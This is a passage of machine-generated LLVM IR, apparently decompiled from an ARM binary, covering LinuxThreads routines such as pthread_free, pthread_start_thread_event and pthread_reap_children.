  %v3_1cb14 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_1cb04, i32 0)
  %v0_1cb18 = load i32, i32* @r4, align 4
  %v1_1cb18 = add i32 %v0_1cb18, 108
  %v2_1cb18 = inttoptr i32 %v1_1cb18 to i32*
  %v3_1cb18 = load i32, i32* %v2_1cb18, align 4
  %v1_1cb20 = icmp slt i32 %v3_1cb18, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  br i1 %v1_1cb20, label %dec_label_pc_1cb34, label %.dec_label_pc_1cb58_crit_edge

.dec_label_pc_1cb58_crit_edge:                    ; preds = %entry
  %v4_1cb2c = add i32 %v0_1cb18, 112
  br label %dec_label_pc_1cb58

dec_label_pc_1cb34:                               ; preds = %entry
  %v4_1cb38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), align 4
  %v1_1cb3c = add i32 %v4_1cb38, 24
  %v2_1cb3c = inttoptr i32 %v1_1cb3c to i32*
  %v3_1cb3c = load i32, i32* %v2_1cb3c, align 4
  %tmp17 = icmp slt i32 %v3_1cb3c, 1
  br i1 %tmp17, label %dec_label_pc_1cb5c, label %dec_label_pc_1cb48

dec_label_pc_1cb48:                               ; preds = %dec_label_pc_1cb34
  store i32 0, i32* %stack_var_-4, align 4
  %v6_1cb50 = ptrtoint i32* %stack_var_-4 to i32
  br label %dec_label_pc_1cb58

dec_label_pc_1cb58:                               ; preds = %.dec_label_pc_1cb58_crit_edge, %dec_label_pc_1cb48
  %v2_1cb58 = phi i32 [ %v4_1cb2c, %.dec_label_pc_1cb58_crit_edge ], [ %v6_1cb50, %dec_label_pc_1cb48 ]
  %v1_1cb58 = phi i32 [ %v3_1cb18, %.dec_label_pc_1cb58_crit_edge ], [ 0, %dec_label_pc_1cb48 ]
  %v0_1cb58.in.in = add i32 %v0_1cb18, 20
  %v0_1cb58.in = inttoptr i32 %v0_1cb58.in.in to i32*
  %v0_1cb58 = load i32, i32* %v0_1cb58.in, align 4
  %v3_1cb58 = call i32 @sched_setscheduler(i32 %v0_1cb58, i32 %v1_1cb58, i32 %v2_1cb58)
  %v0_1cb60.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cb5c

dec_label_pc_1cb5c:                               ; preds = %dec_label_pc_1cb34, %dec_label_pc_1cb58
  %v0_1cb94 = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %dec_label_pc_1cb34 ], [ %v0_1cb60.pre, %dec_label_pc_1cb58 ]
  %v2_1cb60 = add i32 %v0_1cb94, 276
  %v3_1cb60 = inttoptr i32 %v2_1cb60 to i32*
  %v4_1cb60 = load i32, i32* %v3_1cb60, align 4
  %v1_1cb64 = inttoptr i32 %v4_1cb60 to i32*
  %v2_1cb64 = load i32, i32* %v1_1cb64, align 4
  %v2_1cb68 = icmp eq i32 %v2_1cb64, 0
  br i1 %v2_1cb68, label %dec_label_pc_1cbc8, label %dec_label_pc_1cb70

dec_label_pc_1cb70:                               ; preds = %dec_label_pc_1cb5c
  %v2_1cb74 = add i32 %v0_1cb94, 72
  %v3_1cb74 = inttoptr i32 %v2_1cb74 to i32*
  %v4_1cb74 = load i32, i32* %v3_1cb74, align 4
  %v1_1cb78 = inttoptr i32 %v4_1cb74 to i32*
  %v2_1cb78 = load i32, i32* %v1_1cb78, align 4
  %tmp18 = icmp slt i32 %v2_1cb78, 1
  br i1 %tmp18, label %dec_label_pc_1cbc8, label %dec_label_pc_1cb84

dec_label_pc_1cb84:                               ; preds = %dec_label_pc_1cb70
  %v0_1cb90 = load i32, i32* @r4, align 4
  store i32 %v0_1cb90, i32* %stack_var_-32, align 4
  %v2_1cb94 = add i32 %v0_1cb94, 132
  %v3_1cb94 = inttoptr i32 %v2_1cb94 to i32*
  %v4_1cb94 = load i32, i32* %v3_1cb94, align 4
  store i32 %v4_1cb94, i32* @r6, align 4
  br label %dec_label_pc_1cb98

dec_label_pc_1cb98:                               ; preds = %dec_label_pc_1cbb0.dec_label_pc_1cb98_crit_edge, %dec_label_pc_1cb84
  %v0_1cb98 = phi i32 [ %v0_1cb98.pre, %dec_label_pc_1cbb0.dec_label_pc_1cb98_crit_edge ], [ %v4_1cb94, %dec_label_pc_1cb84 ]
  %v1_1cb98 = inttoptr i32 %v0_1cb98 to i32*
  %v2_1cb98 = load i32, i32* %v1_1cb98, align 4
  %v3_1cba4 = call i32 @write(i32 %v2_1cb98, i32 %v2_1caf8, i32 28)
  %v3_1cba8 = icmp eq i32 %v3_1cba4, -1
  br i1 %v3_1cba8, label %dec_label_pc_1cbb0, label %dec_label_pc_1cbc0

dec_label_pc_1cbb0:                               ; preds = %dec_label_pc_1cb98
  %v0_1cbb0 = call i32 @__errno_location()
  %v1_1cbb4 = inttoptr i32 %v0_1cbb0 to i32*
  %v2_1cbb4 = load i32, i32* %v1_1cbb4, align 4
  %v7_1cbb8 = icmp eq i32 %v2_1cbb4, 4
  br i1 %v7_1cbb8, label %dec_label_pc_1cbb0.dec_label_pc_1cb98_crit_edge, label %dec_label_pc_1cbc0

dec_label_pc_1cbb0.dec_label_pc_1cb98_crit_edge:  ; preds = %dec_label_pc_1cbb0
  %v0_1cb98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1cb98

dec_label_pc_1cbc0:                               ; preds = %dec_label_pc_1cb98, %dec_label_pc_1cbb0
  %v0_1cbc0 = load i32, i32* @r4, align 4
  store i32 %v0_1cbc0, i32* @r0, align 4
  %v0_1cbc4 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_1cbc8

dec_label_pc_1cbc8:                               ; preds = %dec_label_pc_1cb70, %dec_label_pc_1cb5c, %dec_label_pc_1cbc0
  %v0_1cbc8 = load i32, i32* @r4, align 4
  %v1_1cbc8 = add i32 %v0_1cbc8, 96
  %v2_1cbc8 = inttoptr i32 %v1_1cbc8 to i32*
  %v3_1cbc8 = load i32, i32* %v2_1cbc8, align 4
  %v1_1cbcc = add i32 %v0_1cbc8, 92
  %v2_1cbcc = inttoptr i32 %v1_1cbcc to i32*
  %v3_1cbcc = load i32, i32* %v2_1cbcc, align 4
  call void @__pseudo_branch(i32 %v3_1cbcc)
  %v2_1cbdc = call i32 @__pthread_do_exit(i32 %v3_1cbc8, i32 %v2_1caf8)
  %v0_1cbe0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cbe0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1cbc8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1cbc8, %bb
  %v6_1cbf0 = phi i32 [ %v2_1cbdc, %dec_label_pc_1cbc8 ], [ 0, %bb ]
  ret i32 %v6_1cbf0

; uselistorder directives
  uselistorder i32 %v2_1caf8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1cbc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cbc0, { 1, 0 }
  uselistorder label %dec_label_pc_1cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_1cb58, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1cbf8 = call i32 @__GI_getpid()
  %v1_1cc00 = load i32, i32* @r4, align 4
  %v2_1cc00 = add i32 %v1_1cc00, 20
  %v3_1cc00 = inttoptr i32 %v2_1cc00 to i32*
  store i32 %v0_1cbf8, i32* %v3_1cc00, align 4
  %v0_1cc04 = load i32, i32* @r4, align 4
  %v1_1cc04 = add i32 %v0_1cc04, 28
  %v2_1cc04 = inttoptr i32 %v1_1cc04 to i32*
  %v3_1cc04 = load i32, i32* %v2_1cc04, align 4
  store i32 %v3_1cc04, i32* @r0, align 4
  %v0_1cc08 = call i32 @__pthread_lock()
  %v0_1cc0c = load i32, i32* @r4, align 4
  %v1_1cc0c = add i32 %v0_1cc0c, 28
  %v2_1cc0c = inttoptr i32 %v1_1cc0c to i32*
  %v3_1cc0c = load i32, i32* %v2_1cc0c, align 4
  %v1_1cc10 = call i32 @__pthread_unlock(i32 %v3_1cc0c)
  %v0_1cc14 = load i32, i32* @r4, align 4
  %v1_1cc18 = call i32 @pthread_start_thread(i32 %v0_1cc14)
  ret i32 %v1_1cc18
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1cc1c = load i32, i32* @r4, align 4
  store i32 %v3_1cc1c, i32* %stack_var_-16, align 4
  %v6_1cc1c = load i32, i32* @r5, align 4
  %v9_1cc1c = load i32, i32* @r6, align 4
  %v12_1cc1c = load i32, i32* @lr, align 4
  %v1_1cc24 = add i32 %arg1, 16
  %v2_1cc24 = inttoptr i32 %v1_1cc24 to i32*
  %v3_1cc24 = load i32, i32* %v2_1cc24, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_1cc30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_1cc38 = urem i32 %v3_1cc24, 1024
  %v4_1cc3c = mul nuw nsw i32 %v3_1cc38, 16
  %v5_1cc3c = add i32 %v4_1cc30, %v4_1cc3c
  store i32 %v5_1cc3c, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v5_1cc3c, i32* @r0, align 4
  %v0_1cc4c = call i32 @__pthread_lock()
  %v1_1cc54 = load i32, i32* @r4, align 4
  %v2_1cc54 = add i32 %v1_1cc54, 8
  %v3_1cc54 = inttoptr i32 %v2_1cc54 to i32*
  store i32 0, i32* %v3_1cc54, align 4
  %v1_1cc5c = load i32, i32* @r4, align 4
  %v2_1cc5c = add i32 %v1_1cc5c, 12
  %v3_1cc5c = inttoptr i32 %v2_1cc5c to i32*
  store i32 -1, i32* %v3_1cc5c, align 4
  %v0_1cc60 = load i32, i32* @r4, align 4
  %v1_1cc64 = call i32 @__pthread_unlock(i32 %v0_1cc60)
  %v0_1cc6c = load i32, i32* @r6, align 4
  %v2_1cc6c = add i32 %v0_1cc6c, 128
  %v3_1cc6c = inttoptr i32 %v2_1cc6c to i32*
  %v4_1cc6c = load i32, i32* %v3_1cc6c, align 4
  %v1_1cc70 = inttoptr i32 %v4_1cc6c to i32*
  %v2_1cc70 = load i32, i32* %v1_1cc70, align 4
  %v0_1cc74 = load i32, i32* @r5, align 4
  %v1_1cc74 = add i32 %v0_1cc74, 328
  %v2_1cc74 = inttoptr i32 %v1_1cc74 to i32*
  %v3_1cc74 = load i32, i32* %v2_1cc74, align 4
  store i32 %v3_1cc74, i32* %r4.global-to-local, align 4
  %v1_1cc78 = add i32 %v2_1cc70, -1
  store i32 %v1_1cc78, i32* %v1_1cc70, align 4
  %v0_1cc8c3 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1cc8c3, i32* @r0, align 4
  %v2_1cc8c5 = icmp eq i32 %v0_1cc8c3, 0
  br i1 %v2_1cc8c5, label %dec_label_pc_1cc94, label %dec_label_pc_1cc84

dec_label_pc_1cc84:                               ; preds = %entry, %dec_label_pc_1cc84
  %v0_1cc84 = phi i32 [ %v0_1cc8c, %dec_label_pc_1cc84 ], [ %v0_1cc8c3, %entry ]
  %v1_1cc84 = inttoptr i32 %v0_1cc84 to i32*
  %v2_1cc84 = load i32, i32* %v1_1cc84, align 4
  store i32 %v2_1cc84, i32* @r4, align 4
  %v0_1cc88 = call i32 @free()
  %v0_1cc8c = load i32, i32* @r4, align 4
  store i32 %v0_1cc8c, i32* @r0, align 4
  %v2_1cc8c = icmp eq i32 %v0_1cc8c, 0
  br i1 %v2_1cc8c, label %dec_label_pc_1cc94, label %dec_label_pc_1cc84

dec_label_pc_1cc94:                               ; preds = %dec_label_pc_1cc84, %entry
  %v0_1cc94 = load i32, i32* @r5, align 4
  %v1_1cc94 = add i32 %v0_1cc94, 332
  %v2_1cc94 = inttoptr i32 %v1_1cc94 to i32*
  %v3_1cc94 = load i32, i32* %v2_1cc94, align 4
  store i32 %v3_1cc94, i32* %r4.global-to-local, align 4
  store i32 %v3_1cc94, i32* @r0, align 4
  %v2_1cca42 = icmp eq i32 %v3_1cc94, 0
  br i1 %v2_1cca42, label %dec_label_pc_1ccac, label %dec_label_pc_1cc9c

dec_label_pc_1cc9c:                               ; preds = %dec_label_pc_1cc94, %dec_label_pc_1cc9c
  %v0_1cc9c = phi i32 [ %v0_1cca4.pr, %dec_label_pc_1cc9c ], [ %v3_1cc94, %dec_label_pc_1cc94 ]
  %v1_1cc9c = inttoptr i32 %v0_1cc9c to i32*
  %v2_1cc9c = load i32, i32* %v1_1cc9c, align 4
  store i32 %v2_1cc9c, i32* @r4, align 4
  %v0_1cca0 = call i32 @free()
  %v0_1cca4.pr = load i32, i32* @r4, align 4
  store i32 %v0_1cca4.pr, i32* @r0, align 4
  %v2_1cca4 = icmp eq i32 %v0_1cca4.pr, 0
  br i1 %v2_1cca4, label %dec_label_pc_1cca4.dec_label_pc_1ccac_crit_edge, label %dec_label_pc_1cc9c

dec_label_pc_1cca4.dec_label_pc_1ccac_crit_edge:  ; preds = %dec_label_pc_1cc9c
  %v0_1ccb4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ccac

dec_label_pc_1ccac:                               ; preds = %dec_label_pc_1cca4.dec_label_pc_1ccac_crit_edge, %dec_label_pc_1cc94
  %v1_1ccd0 = phi i32 [ %v0_1ccb4.pre, %dec_label_pc_1cca4.dec_label_pc_1ccac_crit_edge ], [ %v0_1cc94, %dec_label_pc_1cc94 ]
  %v0_1ccb0 = load i32, i32* @r6, align 4
  %v2_1ccb0 = add i32 %v0_1ccb0, 184
  %v3_1ccb0 = inttoptr i32 %v2_1ccb0 to i32*
  %v4_1ccb0 = load i32, i32* %v3_1ccb0, align 4
  %v9_1ccb4 = icmp eq i32 %v1_1ccd0, %v4_1ccb0
  br i1 %v9_1ccb4, label %dec_label_pc_1cce8, label %dec_label_pc_1ccbc

dec_label_pc_1ccbc:                               ; preds = %dec_label_pc_1ccac
  %v1_1ccbc = add i32 %v1_1ccd0, 272
  %v2_1ccbc = inttoptr i32 %v1_1ccbc to i32*
  %v3_1ccbc = load i32, i32* %v2_1ccbc, align 4
  %v2_1ccc0 = icmp eq i32 %v3_1ccbc, 0
  br i1 %v2_1ccc0, label %dec_label_pc_1ccc8, label %dec_label_pc_1cce8

dec_label_pc_1ccc8:                               ; preds = %dec_label_pc_1ccbc
  %v1_1ccc8 = add i32 %v1_1ccd0, 280
  %v2_1ccc8 = inttoptr i32 %v1_1ccc8 to i32*
  %v3_1ccc8 = load i32, i32* %v2_1ccc8, align 4
  %v2_1cccc = icmp eq i32 %v3_1ccc8, 0
  br i1 %v2_1cccc, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_1ccc8
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_1ccc8, %bb
  %v1_1ccd4 = xor i1 %v2_1cccc, true
  call void @__pseudo_cond_branch(i1 %v1_1ccd4, i32 ptrtoint (i32* @global_var_23430.1209 to i32))
  %v0_1cce0 = load i32, i32* @r5, align 4
  %v2_1cce0 = add i32 %v0_1cce0, -2096800
  %v2_1cce4 = call i32 @munmap(i32 %v2_1cce0, i32 2097152)
  br label %dec_label_pc_1cce8

dec_label_pc_1cce8:                               ; preds = %dec_label_pc_1ccbc, %dec_label_pc_1ccac, %bb15
  %v1_1ccec = phi i32 [ 0, %dec_label_pc_1ccbc ], [ 0, %dec_label_pc_1ccac ], [ %v2_1cce4, %bb15 ]
  %v2_1cce8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1cce8, i32* @r4, align 4
  store i32 %v6_1cc1c, i32* @r5, align 4
  store i32 %v9_1cc1c, i32* @r6, align 4
  store i32 %v12_1cc1c, i32* @lr, align 4
  ret i32 %v1_1ccec

; uselistorder directives
  uselistorder i32 %v0_1cca4.pr, { 2, 1, 0 }
  uselistorder i32 %v0_1cc8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cce8, { 2, 0, 1 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_1cc9c, { 1, 0 }
  uselistorder label %dec_label_pc_1cc84, { 1, 0 }
}

define i32 @function_1ccf4(i16* %arg1) local_unnamed_addr {
dec_label_pc_1ccf4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1ccf4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ccf4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1ccf4
  %v2_1ccf4 = load i32, i32* @r4, align 4
  %v8_1ccf4 = ashr i32 %v2_1ccf4, %tmp
  %v9_1ccf4 = and i32 %v8_1ccf4, %tmp
  %v4_1ccf8 = mul i32 %v9_1ccf4, 2
  %v5_1ccf8 = and i32 %v4_1ccf8, %v9_1ccf4
  store i32 %v5_1ccf8, i32* %r0.global-to-local, align 4
  %v2_1ccfc = trunc i32 %v5_1ccf8 to i16
  %v4_1ccfc = inttoptr i32 %v5_1ccf8 to i16*
  store i16 %v2_1ccfc, i16* %v4_1ccfc, align 2
  %v5_1ccfc = load i32, i32* @r8, align 4
  %v6_1ccfc = load i32, i32* %r0.global-to-local, align 4
  %v7_1ccfc = sub i32 %v6_1ccfc, %v5_1ccfc
  store i32 %v7_1ccfc, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1ccf4, %bb
  %v8_1ccfc = phi i32 [ %tmp, %dec_label_pc_1ccf4 ], [ %v7_1ccfc, %bb ]
  ret i32 %v8_1ccfc

; uselistorder directives
  uselistorder i32 %v5_1ccf8, { 1, 0, 2 }
  uselistorder i32 %v9_1ccf4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1cd0c = call i32 @__pthread_restart_new()
  ret i32 %v0_1cd0c
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_1cd1c = load i32, i32* @r5, align 4
  %v12_1cd1c = load i32, i32* @r7, align 4
  store i32 172, i32* %r3.global-to-local, align 4
  store i32 260, i32* @r7, align 4
  store i32 38352, i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v2_1cd3c = ptrtoint i32* %stack_var_-44 to i32
  store i32 1, i32* @sl, align 4
  store i32 12, i32* @r8, align 4
  store i32 172, i32* %stack_var_-56, align 4
  store i32 -2147483647, i32* %r2.global-to-local, align 4
  %v3_1ce581 = call i32 @waitpid(i32 -1, i32 %v2_1cd3c, i32 -2147483647)
  %v2_1ce5c3 = icmp eq i32 %v3_1ce581, 0
  store i1 %v2_1ce5c3, i1* %cpsr_z.global-to-local, align 1
  %v5_1ce604 = icmp sgt i32 %v3_1ce581, 0
  br i1 %v5_1ce604, label %dec_label_pc_1cd54, label %dec_label_pc_1ce64

dec_label_pc_1cd54:                               ; preds = %entry, %dec_label_pc_1ce4c.backedge
  %v3_1ce585 = phi i32 [ %v3_1ce58, %dec_label_pc_1ce4c.backedge ], [ %v3_1ce581, %entry ]
  %v0_1cd54 = load i32, i32* @r6, align 4
  %v1_1cd54 = load i32, i32* @r7, align 4
  %v2_1cd54 = add i32 %v1_1cd54, %v0_1cd54
  %v3_1cd54 = inttoptr i32 %v2_1cd54 to i32*
  %v4_1cd54 = load i32, i32* %v3_1cd54, align 4
  store i32 %v4_1cd54, i32* %r3.global-to-local, align 4
  %v1_1cd58 = inttoptr i32 %v4_1cd54 to i32*
  %v2_1cd58 = load i32, i32* %v1_1cd58, align 4
  %v1_1cd5c = inttoptr i32 %v2_1cd58 to i32*
  %storemerge.pre = load i32, i32* %v1_1cd5c, align 4
  br label %dec_label_pc_1cdf8

dec_label_pc_1cd64:                               ; preds = %dec_label_pc_1cdf8
  %v1_1cd64 = add i32 %v0_1cd74, 20
  %v2_1cd64 = inttoptr i32 %v1_1cd64 to i32*
  %v3_1cd64 = load i32, i32* %v2_1cd64, align 4
  store i32 %v3_1cd64, i32* %r3.global-to-local, align 4
  %v9_1cd68 = icmp eq i32 %v3_1cd64, %v3_1ce585
  %v1_1cd6c = inttoptr i32 %v0_1cd74 to i32*
  %v2_1cd6c = load i32, i32* %v1_1cd6c, align 4
  store i32 %v2_1cd6c, i32* %r2.global-to-local, align 4
  br i1 %v9_1cd68, label %dec_label_pc_1cd74, label %dec_label_pc_1cdf8

dec_label_pc_1cd74:                               ; preds = %dec_label_pc_1cd64
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_1cd74 = add i32 %v0_1cd74, 4
  %v2_1cd74 = inttoptr i32 %v1_1cd74 to i32*
  %v3_1cd74 = load i32, i32* %v2_1cd74, align 4
  store i32 %v3_1cd74, i32* %r3.global-to-local, align 4
  %v2_1cd78 = add i32 %v2_1cd6c, 4
  %v3_1cd78 = inttoptr i32 %v2_1cd78 to i32*
  store i32 %v3_1cd74, i32* %v3_1cd78, align 4
  %v0_1cd7c = load i32, i32* @r5, align 4
  %v1_1cd7c = add i32 %v0_1cd7c, 4
  %v2_1cd7c = inttoptr i32 %v1_1cd7c to i32*
  %v3_1cd7c = load i32, i32* %v2_1cd7c, align 4
  store i32 %v3_1cd7c, i32* %r3.global-to-local, align 4
  %v1_1cd80 = add i32 %v0_1cd7c, 28
  %v2_1cd80 = inttoptr i32 %v1_1cd80 to i32*
  %v3_1cd80 = load i32, i32* %v2_1cd80, align 4
  store i32 %v3_1cd80, i32* @r0, align 4
  %v0_1cd84 = load i32, i32* %r2.global-to-local, align 4
  %v2_1cd84 = inttoptr i32 %v3_1cd7c to i32*
  store i32 %v0_1cd84, i32* %v2_1cd84, align 4
  %v0_1cd8c = call i32 @__pthread_lock()
  store i32 %v0_1cd8c, i32* @r0, align 4
  %v0_1cd90 = load i32, i32* @r5, align 4
  %v1_1cd90 = add i32 %v0_1cd90, 292
  %v2_1cd90 = inttoptr i32 %v1_1cd90 to i32*
  %v3_1cd90 = load i32, i32* %v2_1cd90, align 4
  store i32 %v3_1cd90, i32* %r3.global-to-local, align 4
  %v2_1cd94 = icmp eq i32 %v3_1cd90, 0
  store i1 %v2_1cd94, i1* %cpsr_z.global-to-local, align 1
  %v0_1cd98 = load i32, i32* @sl, align 4
  %v1_1cd98 = trunc i32 %v0_1cd98 to i8
  %v3_1cd98 = add i32 %v0_1cd90, 46
  %v4_1cd98 = inttoptr i32 %v3_1cd98 to i8*
  store i8 %v1_1cd98, i8* %v4_1cd98, align 1
  %v0_1cd9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1cd9c, label %dec_label_pc_1cdd4, label %dec_label_pc_1cda0

dec_label_pc_1cda0:                               ; preds = %dec_label_pc_1cd74
  store i32 168, i32* %r2.global-to-local, align 4
  %v0_1cda4 = load i32, i32* @r6, align 4
  %v2_1cda4 = add i32 %v0_1cda4, 168
  %v3_1cda4 = inttoptr i32 %v2_1cda4 to i32*
  %v4_1cda4 = load i32, i32* %v3_1cda4, align 4
  store i32 %v4_1cda4, i32* %r3.global-to-local, align 4
  %v0_1cda8 = load i32, i32* @r5, align 4
  %v1_1cda8 = add i32 %v0_1cda8, 296
  %v2_1cda8 = inttoptr i32 %v1_1cda8 to i32*
  %v3_1cda8 = load i32, i32* %v2_1cda8, align 4
  store i32 %v3_1cda8, i32* %r2.global-to-local, align 4
  %v1_1cdac = inttoptr i32 %v4_1cda4 to i32*
  %v2_1cdac = load i32, i32* %v1_1cdac, align 4
  %v2_1cdb0 = or i32 %v2_1cdac, %v3_1cda8
  store i32 %v2_1cdb0, i32* %r3.global-to-local, align 4
  %v1_1cdb4 = and i32 %v2_1cdb0, 2048
  %v2_1cdb4 = icmp eq i32 %v1_1cdb4, 0
  store i1 %v2_1cdb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1cdb4, label %dec_label_pc_1cdd4, label %dec_label_pc_1cdbc

dec_label_pc_1cdbc:                               ; preds = %dec_label_pc_1cda0
  %v2_1cdbc = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_1cdbc, i32* %r2.global-to-local, align 4
  %v2_1cdc0 = add i32 %v2_1cdbc, %v0_1cda4
  %v3_1cdc0 = inttoptr i32 %v2_1cdc0 to i32*
  %v4_1cdc0 = load i32, i32* %v3_1cdc0, align 4
  store i32 %v4_1cdc0, i32* %r3.global-to-local, align 4
  %v0_1cdc4 = load i32, i32* @r8, align 4
  %v2_1cdc4 = add i32 %v0_1cda8, 304
  %v3_1cdc4 = inttoptr i32 %v2_1cdc4 to i32*
  store i32 %v0_1cdc4, i32* %v3_1cdc4, align 4
  %v0_1cdc8 = load i32, i32* @r5, align 4
  %v2_1cdc8 = add i32 %v0_1cdc8, 308
  %v3_1cdc8 = inttoptr i32 %v2_1cdc8 to i32*
  store i32 %v0_1cdc8, i32* %v3_1cdc8, align 4
  %v0_1cdcc = load i32, i32* @r5, align 4
  %v1_1cdcc = load i32, i32* %r3.global-to-local, align 4
  %v2_1cdcc = inttoptr i32 %v1_1cdcc to i32*
  store i32 %v0_1cdcc, i32* %v2_1cdcc, align 4
  %v1_1cdd0 = call i32 @__linuxthreads_reap_event(i32 %v0_1cd8c)
  br label %dec_label_pc_1cdd4

dec_label_pc_1cdd4:                               ; preds = %dec_label_pc_1cda0, %dec_label_pc_1cd74, %dec_label_pc_1cdbc
  %v0_1cdd4 = load i32, i32* @r5, align 4
  %v1_1cdd4 = add i32 %v0_1cdd4, 45
  %v2_1cdd4 = inttoptr i32 %v1_1cdd4 to i8*
  %v3_1cdd4 = load i8, i8* %v2_1cdd4, align 1
  %v4_1cdd4 = zext i8 %v3_1cdd4 to i32
  store i32 %v4_1cdd4, i32* @r4, align 4
  %v1_1cdd8 = add i32 %v0_1cdd4, 28
  %v2_1cdd8 = inttoptr i32 %v1_1cdd8 to i32*
  %v3_1cdd8 = load i32, i32* %v2_1cdd8, align 4
  %v1_1cddc = call i32 @__pthread_unlock(i32 %v3_1cdd8)
  %v0_1cde0 = load i32, i32* @r4, align 4
  %v2_1cde0 = icmp eq i32 %v0_1cde0, 0
  store i1 %v2_1cde0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1cde0, label %dec_label_pc_1ce00, label %dec_label_pc_1cde8

dec_label_pc_1cde8:                               ; preds = %dec_label_pc_1cdd4
  %v0_1cde8 = load i32, i32* @r5, align 4
  %v1_1cdec = call i32 @pthread_free(i32 %v0_1cde8)
  br label %dec_label_pc_1ce00

dec_label_pc_1cdf8:                               ; preds = %dec_label_pc_1cd64, %dec_label_pc_1cd54
  %v0_1cd74 = phi i32 [ %storemerge.pre, %dec_label_pc_1cd54 ], [ %v2_1cd6c, %dec_label_pc_1cd64 ]
  store i32 %v0_1cd74, i32* @r5, align 4
  %v9_1cdf8 = icmp eq i32 %v0_1cd74, %v2_1cd58
  br i1 %v9_1cdf8, label %dec_label_pc_1ce00.loopexit, label %dec_label_pc_1cd64

dec_label_pc_1ce00.loopexit:                      ; preds = %dec_label_pc_1cdf8
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ce00

dec_label_pc_1ce00:                               ; preds = %dec_label_pc_1ce00.loopexit, %dec_label_pc_1cdd4, %dec_label_pc_1cde8
  %v0_1ce00 = load i32, i32* @r6, align 4
  %v1_1ce00 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ce00 = add i32 %v1_1ce00, %v0_1ce00
  %v3_1ce00 = inttoptr i32 %v2_1ce00 to i32*
  %v4_1ce00 = load i32, i32* %v3_1ce00, align 4
  store i32 %v4_1ce00, i32* %r3.global-to-local, align 4
  %v2_1ce04 = icmp eq i32 %v4_1ce00, 0
  store i1 %v2_1ce04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ce04, label %dec_label_pc_1ce20, label %dec_label_pc_1ce0c

dec_label_pc_1ce0c:                               ; preds = %dec_label_pc_1ce00
  %v1_1ce0c = load i32, i32* @r7, align 4
  %v2_1ce0c = add i32 %v1_1ce0c, %v0_1ce00
  %v3_1ce0c = inttoptr i32 %v2_1ce0c to i32*
  %v4_1ce0c = load i32, i32* %v3_1ce0c, align 4
  store i32 %v4_1ce0c, i32* %r3.global-to-local, align 4
  %v1_1ce10 = inttoptr i32 %v4_1ce0c to i32*
  %v2_1ce10 = load i32, i32* %v1_1ce10, align 4
  store i32 %v2_1ce10, i32* %r3.global-to-local, align 4
  %v1_1ce14 = inttoptr i32 %v2_1ce10 to i32*
  %v2_1ce14 = load i32, i32* %v1_1ce14, align 4
  %v9_1ce18 = icmp eq i32 %v2_1ce14, %v2_1ce10
  store i1 %v9_1ce18, i1* %cpsr_z.global-to-local, align 1
  store i32 118304, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v9_1ce18, i32 ptrtoint (i32* @global_var_1cd04.1216 to i32))
  br label %dec_label_pc_1ce20

dec_label_pc_1ce20:                               ; preds = %dec_label_pc_1ce00, %dec_label_pc_1ce0c
  %v3_1ce20 = load i32, i32* %stack_var_-44, align 4
  %v1_1ce24 = urem i32 %v3_1ce20, 128
